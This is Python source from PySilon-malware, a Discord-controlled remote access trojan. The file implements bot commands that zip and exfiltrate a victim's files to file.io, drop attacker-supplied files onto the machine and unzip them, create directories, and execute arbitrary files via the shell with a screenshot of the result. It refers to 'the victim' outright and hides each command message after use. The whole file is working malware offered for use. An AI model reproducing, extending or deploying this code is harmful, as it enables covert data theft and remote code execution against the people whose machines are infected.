from bs4 import BeautifulSoup
from zipfile import ZipFile
import requests
import os

@client.command(name='download')
async def file_downloading(ctx, file_to_download=None):
    await ctx.message.delete()
    if file_to_download != None:
        if os.path.exists(file_to_download):
            target_file = file_to_download
            if os.path.isdir(target_file):
                target_file += '.zip'
                with ZipFile(target_file,'w') as zip:
                    for file in pysilon_misc.get_all_file_paths('.'.join(target_file.split('.')[:-1])):
                        try:
                            zip.write(file)
                        except Exception as e:
                            await ctx.send(e)
                            pass
            await ctx.send("```Uploading to file.io... This can take a while depending on the file size and the victim's internet speed...```")
            data = {'file': open(target_file, 'rb')}
            url = 'https://file.io/'
            response = requests.post(url, files=data)
            data = response.json()
            embed = discord.Embed(title=f"🟢 {file_to_download}",description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
            await ctx.send('Warning: The file will be removed from file.io right after the first download.')
        else:
            embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

async def unzip(ctx, file):
    archive_password = None 

    def get_archive_pass(m):
        return m.content and m.channel == ctx.channel
    
    try:
        with ZipFile(file) as zip_file:
            embed = discord.Embed(title='🔴 Hold on!', description='```This zip file is password protected.\n\nPlease send the password here.```', colour=discord.Colour.red())
            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
            
            try: zip_file.testzip()
            except: await ctx.send(embed=embed); archive_password = await client.wait_for('message', check=get_archive_pass); archive_password = archive_password.content

            zip_file.extractall(pwd=archive_password.encode()) if archive_password != None else zip_file.extractall()
            embed = discord.Embed(title='🟢 Success', description='```The zip file has been successfully extracted.```', colour=discord.Colour.green())
            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
            await ctx.send(embed=embed)
    except:
        embed = discord.Embed(title='📛 Error', description='Failed to unzip the file.', colour=discord.Colour.red())
        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
        return await ctx.send(embed=embed)

@client.command(name='upload')
async def file_uploading(ctx, argument=None, name_of_file=None):
    await ctx.message.delete()

    async def is_archive(filename):
        embed = discord.Embed(title='🔵 Zip file detected', description='```Would you like to unzip it?```', colour=discord.Colour.blue())
        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
        reaction_message = await ctx.send(embed=embed); await reaction_message.add_reaction('✅'); await reaction_message.add_reaction('❌')
        
        def extract_zipfile_user_confirm(reaction, user):
            return str(reaction.emoji) in ['✅', '❌'] and user == ctx.author
        
        try:
            reaction, user = await client.wait_for('reaction_add', check=extract_zipfile_user_confirm)
            if str(reaction.emoji) == '✅':
                await unzip(ctx, filename)
        except asyncio.TimeoutError: await ctx.send("```❗ Reaction listener has timed out.```")

    if argument == 'small':
        embed = discord.Embed(title='📤 Waiting for file...', description='Send the file you wish to upload here.', colour=discord.Colour.blue())
        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
        await ctx.send(embed=embed)
        
        def wait_for_discord_file(m):
            return m.attachments and m.channel == ctx.channel
        msg = await client.wait_for('message', check=wait_for_discord_file)
        
        try:
            filename = msg.attachments[0].filename
            await msg.attachments[0].save(fp=filename)
        except: return await ctx.send("```❗ File failed to upload.```")

        embed = discord.Embed(title=f"🟢 Success",description=f"Your file '{filename}' has been successfully uploaded.", colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed) 

        if filename.endswith('.zip'):
            await is_archive(filename)       

    elif argument == 'big':
        if name_of_file != None:
            embed = discord.Embed(title='📤 Waiting for file...', description='Please upload your file to [file.io](https://file.io/) and send the link here.', colour=discord.Colour.blue())
            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
            await ctx.send(embed=embed)

            def wait_for_file_io_link(m):
                return m.content and m.channel == ctx.channel
            target_file = await client.wait_for('message', check=wait_for_file_io_link)
            target_file = target_file.content

            if not target_file.startswith("https://file.io"): return await ctx.send("```❗ Your message did not contain a file.io link.```")

            html_content = f'''
            <a href="{target_file}" download="download" title="Download"></a>
            '''
            soup = BeautifulSoup(html_content, 'html.parser')
            download_link = soup.find('a')['href']
            response = requests.get(download_link)

            if response.status_code == 200:
                with open(f'{name_of_file}', 'wb') as f:
                    f.write(response.content)
            else: return await ctx.send("```❗ File failed to upload.```")
            
            embed = discord.Embed(title=f"🟢 Success",description=f"```Your file '{name_of_file}' has been successfully uploaded.```", colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)

            if name_of_file.endswith('.zip'):
                await is_archive(name_of_file)

        else:
            embed = discord.Embed(title="📛 Error",description=f'```Syntax: .upload big <file_name.ext>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        
    else:
        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .upload <small / big>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name="unzip")
async def unzip_command(ctx, filename=None):
    if filename != None:
        await ctx.message.delete()
        await unzip(ctx, filename)
    else:
        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .unzip <path/to/zip_file>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name="mkdir")
async def create_directory(ctx, path=None):
    await ctx.message.delete()
    if path != None:
        try:
            os.mkdir(path)
            embed = discord.Embed(title=f"🟢 Success",description=f"```Directory {path} has been successfully created.```", colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="📛 Error",description=f'```Something went wrong.\n\n{str(e)}```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .mkdir <path>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name="execute")
async def execute_file(ctx, file_to_exec=None):
    await ctx.message.delete()
    if file_to_exec != None:
        if os.path.exists(file_to_exec):
            try:
                subprocess.run('start "" "' + file_to_exec + '"', shell=True)
                await asyncio.sleep(1)
                ImageGrab.grab(all_screens=True).save('ss.png')
                await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time() + ' `[Executed: ' + file_to_exec + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
                subprocess.run('del ss.png', shell=True)
                await ctx.send('```Successfully executed: ' + file_to_exec + '```')
            except Exception as e:
                await ctx.send(f'```❗ Something went wrong...```\n{str(e)}')
        else:
            await ctx.send('```❗ File or directory not found.```')
    else:
        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .execute <path/to/file>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)